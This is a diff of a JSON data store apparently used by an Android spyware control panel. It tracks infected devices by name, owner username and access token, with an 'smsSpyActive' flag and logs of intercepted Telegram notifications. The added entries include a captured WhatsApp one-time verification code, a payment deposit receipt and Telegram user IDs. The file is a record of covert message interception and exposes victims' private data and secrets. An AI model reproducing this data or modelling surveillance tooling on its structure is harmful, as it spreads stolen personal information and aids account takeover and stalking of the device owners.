@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778094330,
+    "lastSeen": 1776778099896,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778094598,
+    "lastSeen": 1776778101783,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********761\n💰 Price: Rp 4.100\n🔢 Code: 182946\n━━━━━━━━━━━━━━━\n📨 Message:\nYour WhatsApp Business code 182-946\nDon't share this code with others\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008762036\n🏷️ System ID: FSCL33773076\n⏰ 21 Apr 2026 • 20:27 WIB\n\n#OTP #WHATSAPP",
+        "time": "21/04 20:28",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778102343
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: ❄️ Akun Terhapus",
+        "content": "coba",
+        "time": "21/04 20:28",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778102318
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16826 pesan baru dari 118 obrolan",
+        "time": "21/04 20:28",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778102206
+      },
       {
         "appName": "Telegram",
         "sender": "SEWA WA BY LIFESTYLE😈: Rose",
@@ -14378,30 +14402,6 @@
         "time": "21/04 20:13",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777221594
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / MU*************\n🏦 Method: DANA\n💰 Amount: Rp 10.000\n💸 Fee: Rp 181\n💵 Total Payload: Rp 10.181\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421210731241799\n🏷️ System ID: FSCL68794690\n⏰ 21 Apr 2026 • 20:12 WIB\n\n#DEPOSIT #DANA",
-        "time": "21/04 20:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777221572
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
-        "content": "🎉 User Baru Masuk!\n\n👤 @WizZzXTzy\n🆔 1887632665\n⏰ 21/4/2026, 13.09.28",
-        "time": "21/04 20:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777221555
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB CPANEL BY PRABOWO: ✧ кαууη`χ [ 𝗥𝗘𝗔𝗗𝗬 𝗩𝗣𝗦 & 𝗣𝗔𝗡𝗘𝗟 ]",
-        "content": "adminin gw",
-        "time": "21/04 20:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777221495
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778093863,
+    "lastSeen": 1776778099866,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
